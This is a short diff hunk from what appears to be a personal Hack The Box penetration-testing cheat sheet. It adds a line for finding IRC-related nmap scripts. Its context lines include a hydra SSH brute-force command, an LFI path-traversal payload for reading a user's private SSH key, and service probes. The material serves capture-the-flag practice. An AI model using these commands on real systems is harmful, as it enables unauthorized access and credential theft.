@@ -18,6 +18,8 @@ hydra -L users -P pw ssh://10.10.10.7 #brute force on ssh protocol with username
 
 ls /etc | grep fail2ban #grep fail2ban filenames from etc folder
 
+ls -l /usr/share/nmap/scripts/irc- #for searching for related service vulnerability in nse (htb irked)
+
 graph.php?current_lang=../../../../var/lib/asterisk(username)/.ssh/id_rsa #See if you can get users private key if you find an LFI
 
 telnet 10.10.10.7 25 #telnet to see if the smtp port is responding
